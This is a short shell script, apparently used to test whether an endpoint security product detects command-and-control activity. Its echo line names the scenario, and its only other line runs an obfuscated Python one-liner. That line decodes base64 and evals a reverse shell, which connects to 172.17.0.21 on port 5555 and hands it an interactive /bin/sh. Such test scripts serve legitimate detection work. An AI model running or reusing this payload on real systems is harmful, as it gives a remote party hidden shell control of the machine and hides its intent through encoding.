#/bin/sh

echo -e "\e[92mExecuting Command and Control via Remote Access Tools using obfuscated Python script. A Falcon Prevent action can kill the attempt"
python -c 'import base64;dec=base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4xNy4wLjIxIiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItIl0pOw==");eval(compile(dec,"<string>","exec"))'
